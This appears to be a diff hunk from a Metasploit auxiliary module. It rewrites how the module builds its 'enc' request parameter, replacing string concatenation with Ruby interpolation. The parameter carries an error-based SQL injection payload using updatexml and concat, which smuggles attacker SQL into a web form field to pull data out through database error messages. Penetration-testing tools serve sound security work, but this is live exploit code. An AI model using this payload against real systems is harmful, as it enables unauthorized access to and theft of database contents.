@@ -84,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
         'pid' => '1',
         'doc_type' => '1',
         'doc_id' => '1',
-        'enc' => "1' and updatexml(1,concat(0x7e, (" + payload + ")),0) or '"
+        'enc' => "1' and updatexml(1,concat(0x7e, (#{payload})),0) or '"
       }
     )
   end
